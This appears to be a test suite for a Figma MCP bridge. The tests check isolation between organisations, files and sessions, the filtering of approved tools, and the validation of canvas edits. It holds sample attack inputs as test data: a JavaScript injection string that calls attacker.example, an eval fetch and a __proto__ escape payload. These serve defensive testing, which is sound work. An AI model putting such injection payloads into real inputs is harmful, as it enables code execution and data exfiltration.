import test from "node:test";
import assert from "node:assert/strict";
import { once } from "node:events";
import vm from "node:vm";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { SSEClientTransport } from "@modelcontextprotocol/sdk/client/sse.js";
import {
  CorePolicies,
  SharedRegistry,
  createSharedBridge,
} from "../shared.mjs";
import { createHttpApp } from "../server.mjs";
import { canvasCode, validateOperations } from "../canvas.mjs";

const A = "aaaaaaaaaaaaaaaaaaaaaa",
  B = "bbbbbbbbbbbbbbbbbbbbbb";
const schema = (properties, required) => ({
  type: "object",
  properties,
  required,
  additionalProperties: false,
});
function upstream() {
  const calls = [];
  const file = {
    fileKey: { type: "string" },
    nodeId: { type: "string" },
    sessionId: { type: "string" },
  };
  const tools = [
    { name: "get_metadata", inputSchema: schema(file, ["fileKey"]) },
    {
      name: "get_design_context",
      inputSchema: schema(
        { ...file, disableCodeConnect: { type: "boolean" } },
        ["fileKey", "nodeId"],
      ),
    },
    {
      name: "create_session",
      inputSchema: schema({ fileKey: { type: "string" } }, ["fileKey"]),
    },
    {
      name: "use_figma",
      inputSchema: schema({ ...file, code: { type: "string" } }, [
        "fileKey",
        "code",
      ]),
    },
    ...[
      "whoami",
      "get_libraries",
      "list_shaders",
      "get_shader",
      "weave_run_tool",
      "create_new_file",
      "new_upstream_tool",
    ].map((name) => ({ name, inputSchema: schema({}, []) })),
  ];
  return {
    calls,
    tools,
    async listTools() {
      return { tools };
    },
    async callTool(request) {
      calls.push(request);
      if (request.name === "create_session")
        return {
          structuredContent: {
            sessionId: "12345678-1234-4234-8234-123456789abc",
          },
          content: [],
        };
      return { content: [{ type: "text", text: request.arguments.fileKey }] };
    },
    async close() {},
  };
}

test("shared bridge exposes only reviewed file tools and structured writes", async () => {
  const provider = upstream(),
    bridge = createSharedBridge({
      policy: { fileKeys: [A] },
      connect: async () => provider,
    });
  await bridge.ready();
  const listing = bridge.listing();
  assert.deepEqual(
    listing.map((t) => t.name),
    ["get_metadata", "get_design_context", "edit_canvas"],
  );
  for (const tool of listing) {
    assert.deepEqual(tool.inputSchema.properties.fileKey.enum, [A]);
    assert.equal(tool.inputSchema.properties.sessionId, undefined);
  }
  for (const name of [
    "whoami",
    "get_libraries",
    "list_shaders",
    "get_shader",
    "weave_run_tool",
    "create_new_file",
    "new_upstream_tool",
    "use_figma",
  ]) {
    await assert.rejects(
      bridge.call(name, { fileKey: A, code: "return figma.root" }),
      /unavailable/,
    );
  }
  assert.equal(provider.calls.length, 0);
  await bridge.call("get_metadata", { fileKey: A });
  assert.equal(provider.calls.at(-1).arguments.fileKey, A);
  assert.match(provider.calls.at(-1).arguments.sessionId, /^12345678/);
  await bridge.close();
});

test("foreign files, guessed sessions, nested selectors and unknown parameters never reach Figma", async () => {
  const provider = upstream(),
    bridge = createSharedBridge({
      policy: { fileKeys: [A] },
      connect: async () => provider,
    });
  for (const args of [
    { fileKey: B },
    { fileKey: A, sessionId: "foreign-session" },
    { fileKey: A, sourceFileKey: B },
    { fileKey: A, upload: { fileKey: B } },
    { fileKey: { value: A } },
    { fileKey: A, nodeId: "https://figma.com/file/" + B },
  ])
    await assert.rejects(bridge.call("get_metadata", args));
  assert.equal(provider.calls.length, 0);
  await bridge.call("get_design_context", {
    fileKey: A,
    nodeId: "1:2",
    disableCodeConnect: false,
  });
  assert.equal(provider.calls.at(-1).arguments.disableCodeConnect, true);
  await bridge.close();
});

test("new required upstream arguments quarantine a previously approved tool", async () => {
  const provider = upstream();
  provider.tools[0].inputSchema.required.push("sourceFileKey");
  provider.tools[0].inputSchema.properties.sourceFileKey = { type: "string" };
  const bridge = createSharedBridge({
    policy: { fileKeys: [A] },
    connect: async () => provider,
  });
  await bridge.ready();
  assert.equal(
    bridge.listing().some((t) => t.name === "get_metadata"),
    false,
  );
  await assert.rejects(
    bridge.call("get_metadata", { fileKey: A }),
    /unavailable/,
  );
  assert.equal(provider.calls.length, 0);
  await bridge.close();
});

test("canvas edits generate fixed code and reject executable/property escape inputs", async () => {
  const provider = upstream(),
    bridge = createSharedBridge({
      policy: { fileKeys: [A] },
      connect: async () => provider,
    });
  await bridge.call("edit_canvas", {
    fileKey: A,
    operations: [
      {
        action: "createFrame",
        ref: "card",
        properties: {
          width: 400,
          height: 300,
          fills: [{ type: "SOLID", color: { r: 1, g: 1, b: 1 } }],
        },
      },
    ],
  });
  const call = provider.calls.at(-1);
  assert.equal(call.name, "use_figma");
  assert.equal(call.arguments.fileKey, A);
  const attacks = [
    [{ action: "eval", text: "fetch('https://example.com')" }],
    [
      {
        action: "createFrame",
        ref: "x",
        properties: { mainComponent: "foreign-component" },
      },
    ],
    [
      {
        action: "createFrame",
        ref: "x",
        properties: JSON.parse('{"__proto__":{"constructor":"escape"}}'),
      },
    ],
    [
      {
        action: "createFrame",
        ref: "x",
        properties: { fills: [{ type: "IMAGE", imageHash: "foreign-image" }] },
      },
    ],
    [
      {
        action: "setProperties",
        target: "foreign-file",
        properties: { parent: B },
      },
    ],
  ];
  for (const operations of attacks)
    assert.throws(() => validateOperations(operations));
  await assert.rejects(
    bridge.call("edit_canvas", {
      fileKey: B,
      operations: [{ action: "createFrame", ref: "x" }],
    }),
    /approved/,
  );
  await assert.rejects(
    bridge.call("edit_canvas", {
      fileKey: A,
      code: "return 1",
      operations: [{ action: "createFrame", ref: "x" }],
    }),
    /Unsupported/,
  );
  await bridge.close();
});

test("text and names containing JavaScript remain data in the generated program", async () => {
  const text =
    '"}; globalThis.stolen = true; fetch("https://attacker.example"); //';
  const nodes = [];
  const figma = {
    async loadFontAsync() {},
    createText() {
      const node = {
        id: "1:2",
        type: "TEXT",
        fontName: { family: "Inter", style: "Regular" },
        name: "Text",
        characters: "",
      };
      nodes.push(node);
      return node;
    },
  };
  const context = vm.createContext({ figma });
  const code = canvasCode([
    { action: "createText", ref: "title", text, properties: { name: text } },
  ]);
  await vm.runInContext(`(async()=>{${code}})()`, context);
  assert.equal(nodes[0].characters, text);
  assert.equal(nodes[0].name, text);
  assert.equal(context.stolen, undefined);
});

test("policy client rejects incomplete, empty, dedicated and failed policies", async () => {
  for (const data of [
    { mode: "shared", fileKeys: [], revision: "1" },
    { mode: "dedicated", fileKeys: [A], revision: "1" },
    { mode: "shared", fileKeys: ["../foreign"], revision: "1" },
    {},
  ]) {
    const core = new CorePolicies({
      baseUrl: "http://core",
      serviceSecret: "service",
      fetchImpl: async () => Response.json(data),
    });
    await assert.rejects(core.get("acme", "org-token"), { status: 503 });
  }
  let request;
  const core = new CorePolicies({
    baseUrl: "http://core",
    serviceSecret: "service",
    fetchImpl: async (url, init) => {
      request = { url, init };
      return Response.json({ mode: "shared", fileKeys: [A], revision: "1" });
    },
  });
  assert.deepEqual((await core.get("acme", "org-token")).fileKeys, [A]);
  assert.equal(request.url, "http://core/internal/orgs/acme/figma-policy");
  assert.equal(request.init.headers["X-Figma-Relay-Token"], "org-token");
  await assert.rejects(core.get("../foreign", "token"), { status: 400 });
});

test("real MCP clients cannot cross org/file/session boundaries and policy revocation takes effect", async (t) => {
  const providers = [];
  const policies = {
    acme: { fileKeys: [A], revision: "1" },
    beta: { fileKeys: [B], revision: "1" },
  };
  const core = {
    get: async (slug, token) => {
      if (token !== slug + "-token" || !policies[slug]) {
        const error = new Error("Forbidden");
        error.status = 403;
        throw error;
      }
      return { ...policies[slug] };
    },
  };
  const registry = new SharedRegistry({
    core,
    createBridge: (policy) => {
      const provider = upstream();
      providers.push(provider);
      return createSharedBridge({ policy, connect: async () => provider });
    },
  });
  const { app, close } = createHttpApp({ registry, onError: () => {} });
  const server = app.listen(0, "127.0.0.1");
  await once(server, "listening");
  t.after(async () => {
    await close();
    server.closeAllConnections();
    await new Promise((resolve) => server.close(resolve));
  });
  const base = `http://127.0.0.1:${server.address().port}`;
  async function connect(slug) {
    const client = new Client({ name: "shared-policy-test", version: "1" });
    const transport = new SSEClientTransport(
      new URL(base + `/orgs/${slug}/sse`),
      { requestInit: { headers: { Authorization: `Bearer ${slug}-token` } } },
    );
    await client.connect(transport);
    t.after(() => client.close());
    return { client, transport };
  }
  const a = await connect("acme"),
    b = await connect("beta");
  assert.equal(
    (
      await a.client.callTool({
        name: "get_metadata",
        arguments: { fileKey: A },
      })
    ).content[0].text,
    A,
  );
  assert.equal(
    (
      await b.client.callTool({
        name: "get_metadata",
        arguments: { fileKey: B },
      })
    ).content[0].text,
    B,
  );
  for (const name of ["get_metadata", "edit_canvas", "whoami", "use_figma"]) {
    const result = await a.client.callTool({
      name,
      arguments: { fileKey: B, code: "return figma.root" },
    });
    assert.equal(result.isError, true);
  }
  assert.equal(
    providers[0].calls.some((call) => call.arguments.fileKey === B),
    false,
  );
  const endpoint = a.transport._endpoint;
  const post = () =>
    fetch(base + endpoint.pathname + endpoint.search, {
      method: "POST",
      headers: {
        Authorization: "Bearer acme-token",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        method: "notifications/initialized",
      }),
    });
  policies.acme = { fileKeys: [A], revision: "2" };
  assert.equal((await post()).status, 409);
  delete policies.acme;
  assert.equal((await post()).status, 403);
});
